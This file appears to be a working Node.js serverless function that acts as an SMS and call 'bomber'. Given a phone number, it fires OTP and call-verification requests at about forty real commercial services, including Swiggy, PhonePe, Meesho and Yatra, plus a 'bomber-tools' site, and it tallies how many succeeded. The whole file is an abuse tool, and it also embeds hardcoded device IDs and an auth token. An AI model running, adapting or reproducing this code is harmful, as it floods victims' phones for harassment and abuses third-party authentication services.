const fetch = require("node-fetch");

// Helper function to create API configurations
const makeApi = ({ name, url, method, headers, getBody, isFormData = false }) => ({
  name,
  url,
  method,
  headers,
  body: (phone) => getBody(phone),
  isFormData
});

exports.handler = async (event) => {
  const method = event.httpMethod;
  let phone;

  if (method === "GET") {
    phone = event.queryStringParameters.phone;
  } else if (method === "POST") {
    phone = JSON.parse(event.body || "{}").phone;
  }

  if (!phone) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Missing phone number" }),
    };
  }

  // All API configurations
  const apis = [
    // Snapdeal
    makeApi({
      name: "snapdeal",
      url: "https://m.snapdeal.com/sendOTP",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobileNumber: phone,
        purpose: "LOGIN_WITH_MOBILE_OTP"
      })
    }),

    // Samsung
    makeApi({
      name: "samsung",
      url: "https://www.samsung.com/in/api/v1/sso/otp/init",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        user_id: phone
      })
    }),

    // Swiggy
    makeApi({
      name: "swiggy",
      url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobile: phone
      })
    }),

    // Bomber Tools (GET)
    makeApi({
      name: "bomber_tools",
      url: `https://bomber-tools.xyz/?mobile=${phone}&accesskey=bombersmm&submit=Submit`,
      method: "GET",
      headers: {},
      getBody: () => null
    }),

    // OLX
    makeApi({
      name: "olx",
      url: "https://www.olx.in/api/auth/authenticate?lang=en-IN",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        method: "call",
        phone: `+91${phone}`,
        language: "en-IN",
        grantType: "retry"
      })
    }),

    // Proptiger
    makeApi({
      name: "proptiger",
      url: "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        contactNumber: phone,
        domainId: "2"
      })
    }),

    // Meesho
    makeApi({
      name: "meesho",
      url: "https://www.meesho.com/api/v1/user/login/request-otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        phone_number: phone
      })
    }),

    // PhonePe
    makeApi({
      name: "phonepe",
      url: "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        rmn: phone,
        purpose: "REGISTRATION"
      })
    }),

    // Rupaiya Raja (GET)
    makeApi({
      name: "rupaiya_raja",
      url: `https://rupaiyaraja.com/9987/src/api/otp.php?num=${phone}`,
      method: "GET",
      headers: {},
      getBody: () => null
    }),

    // TLLMS
    makeApi({
      name: "tllms",
      url: "https://identity.tllms.com/api/request_otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        feature: "",
        phone: `+91${phone}`,
        type: "sms",
        app_client_id: "null"
      })
    }),

    // Country Delight
    makeApi({
      name: "country_delight",
      url: "https://api.countrydelight.in/api/auth/new_request_otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        new_user: true,
        mobile_no: phone
      })
    }),

    // More Retail
    makeApi({
      name: "more_retail",
      url: "https://omni-api.moreretail.in/api/v1/login/",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        hash_key: "XfsoCeXADQA",
        phone_number: phone
      })
    }),

    // Khatabook
    makeApi({
      name: "khatabook",
      url: "https://api.khatabook.com/v1/auth/request-otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        app_signature: "Jc/Zu7qNqQ2",
        country_code: "+91",
        phone: phone
      })
    }),

    // Trinkerr
    makeApi({
      name: "trinkerr",
      url: "https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobile: phone,
        otpOperationType: "SignUp"
      })
    }),

    // Doubtnut
    makeApi({
      name: "doubtnut",
      url: "https://api.doubtnut.com/v4/student/login",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        is_web: "3",
        phone_number: phone
      })
    }),

    // My11Circle
    makeApi({
      name: "my11circle",
      url: "https://www.my11circle.com/api/fl/auth/v3/getOtp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        isPlaycircle: false,
        mobile: phone,
        deviceId: "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
        deviceName: "",
        refCode: ""
      })
    }),

    // DocTime
    makeApi({
      name: "doctime",
      url: "https://admin.doctime.com.bd/api/otp/send",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        contact: phone
      })
    }),

    // Eat-Z
    makeApi({
      name: "eat_z",
      url: "https://api.eat-z.com/auth/customer/signin",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        username: phone
      })
    }),

    // PenPencil
    makeApi({
      name: "penpencil",
      url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        organizationId: "5eb393ee95fab7468a79d189",
        mobile: phone
      })
    }),

    // Rummy Circle
    makeApi({
      name: "rummy_circle",
      url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        isPlaycircle: false,
        mobile: phone,
        deviceId: "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
        deviceName: "",
        refCode: ""
      })
    }),

    // ForexWin
    makeApi({
      name: "forexwin",
      url: "https://api.forexwin.co/api/sendOtp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        phone: phone
      })
    }),

    // Shopify Lambda
    makeApi({
      name: "shopify_lambda",
      url: "https://ihd2pujymdta4ygvyu6feys4240ivyxt.lambda-url.us-east-2.on.aws/",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        action: "check_existing_customer",
        user_id: 28438,
        shopify_store_name: "menmomswebstore.myshopify.com",
        identifier: `+91${phone}`,
        return_to: "/collections/prams-strollers",
        auth_token: "16210de841e42a3eadf4441ce8e520d7"
      })
    }),

    // Damensch
    makeApi({
      name: "damensch",
      url: "https://www.damensch.com/api/notification/otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobileNo: phone,
        entityType: 1,
        templateId: 1,
        isChannelStore: false
      })
    }),

    // Yatra (Send OTP)
    makeApi({
      name: "yatra_send_otp",
      url: "https://secure.yatra.com/social/common/yatra/sendMobileOTP",
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      getBody: (phone) => `isdCode=91&mobileNumber=${phone}`,
      isFormData: true
    }),

    // Yatra (Mobile Status)
    makeApi({
      name: "yatra_mobile_status",
      url: "https://secure.yatra.com/social/common/yatra/mobileStatus",
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      getBody: (phone) => `isdCode=91&mobileNumber=${phone}`,
      isFormData: true
    }),

    // HealthKart (Login)
    makeApi({
      name: "healthkart_login",
      url: `https://www.healthkart.com/veronica/user/login/send/otp/1/${phone}?trkSrc=MYA-LPOPUP&forgotPassword=false&plt=2&st=1`,
      method: "GET",
      headers: {},
      getBody: () => null
    }),

    // HealthKart (Signup)
    makeApi({
      name: "healthkart_signup",
      url: `https://www.healthkart.com/veronica/user/validate/1/${phone}/signup?plt=2&st=1`,
      method: "GET",
      headers: {},
      getBody: () => null
    }),

    // PharmEasy
    makeApi({
      name: "pharmeasy",
      url: "https://pharmeasy.in/apt-api/login/send-otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        param: phone
      })
    }),

    // PolicyBazaar
    makeApi({
      name: "policybazaar",
      url: "https://myaccount.policybazaar.com/myacc/login/sendOtpV3",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        SMSType: 1,
        CountryCode: "91",
        Mobile: phone,
        OTPLogin: true,
        source: "MYACC",
        isCustReg: true,
        requestReason: "OTPLogin"
      })
    }),

    // Tata Digital
    makeApi({
      name: "tata_digital",
      url: "https://api.tatadigital.com/api/v2/sso/check-phone",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        countryCode: "91",
        phone: phone,
        sendOtp: true,
        recaptchaToken: "..."
      })
    }),

    // eBay
    makeApi({
      name: "ebay",
      url: "https://export.ebay.com/back_api/seller_form/create/",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        type: "form-in",
        "g-recaptcha-response": "...",
        customer_phone: phone,
        country: "IN"
      })
    }),

    // Xiaomi
    makeApi({
      name: "xiaomi",
      url: "https://in.account.xiaomi.com/pass/sendPhoneRegTicket",
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      getBody: (phone) => `region=IN&phone=%2B91${phone}&sid=i18n_in_pc_pro`,
      isFormData: true
    }),

    // Purplle (GET)
    makeApi({
      name: "purplle",
      url: `https://www.purplle.com/neo/user/authorization/v2/send_otp?phone=${phone}`,
      method: "GET",
      headers: {},
      getBody: () => null
    }),

    // Reliance Retail
    makeApi({
      name: "reliance_retail",
      url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobile: phone
      })
    }),

    // Tata Digital Croma
    makeApi({
      name: "tata_digital_croma",
      url: "https://api.tatadigital.com/api/v2/sso/check-phone-croma",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        countryCode: "91",
        phone: phone
      })
    }),

    // Bajaj Electronics (Form Data)
    makeApi({
      name: "bajaj_electronics",
      url: "https://www.bajajelectronics.com/Customer/sendOTP",
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      getBody: (phone) => `phoneNumber=${phone}`,
      isFormData: true
    }),

    // Bajaj Electronics (GET)
    makeApi({
      name: "bajaj_electronics_get",
      url: `https://www.bajajelectronics.com/Customer/SendRegistrationRequestOTP?mobileNumber=${phone}`,
      method: "GET",
      headers: {},
      getBody: () => null
    }),

    // KukuFM
    makeApi({
      name: "kukufm",
      url: "https://kukufm.com/api/v1/users/auth/send-otp/",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        phone_number: `+91${phone}`
      })
    }),

    // FanCode
    makeApi({
      name: "fancode",
      url: "https://www.fancode.com/graphql",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        operationName: "RequestOTP",
        variables: { mobileNumber: phone },
        query: "query RequestOTP($mobileNumber: String!) { requestOTP(mobileNumber: $mobileNumber) { success message } }"
      })
    }),

    // Raaga Silk Tales
    makeApi({
      name: "raaga_silk_tales",
      url: "https://raagasilktales.com/ajax_function.php",
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      getBody: (phone) => `mobileOtpLoginNew=${phone}`,
      isFormData: true
    }),

    // Bewakoof
    makeApi({
      name: "bewakoof",
      url: "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobile: phone,
        country_code: "+91"
      })
    }),

    // Blinkit
    makeApi({
      name: "blinkit",
      url: "https://blinkit.com/v2/accounts/",
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      getBody: (phone) => `user_phone=${phone}`,
      isFormData: true
    }),

    // Fabindia
    makeApi({
      name: "fabindia",
      url: "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      getBody: (phone) => JSON.stringify({
        mobileDailCode: "+91",
        mobileNumber: phone,
        isLogin: false,
        isSignUp: false
      })
    })
  ];

  let results = [];

  for (const api of apis) {
    try {
      const options = {
        method: api.method,
        headers: api.headers
      };

      if (api.method !== 'GET') {
        options.body = api.isFormData ? api.body(phone) : api.body(phone);
      }

      const res = await fetch(api.url, options);
      results.push({ 
        name: api.name,
        status: res.status,
        url: api.url
      });
    } catch (err) {
      results.push({ 
        name: api.name,
        status: "error",
        error: err.message,
        url: api.url
      });
    }
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ 
      phone,
      results,
      total_apis: apis.length,
      success_count: results.filter(r => r.status === 200).length,
      error_count: results.filter(r => r.status !== 200).length
    }),
  };
};
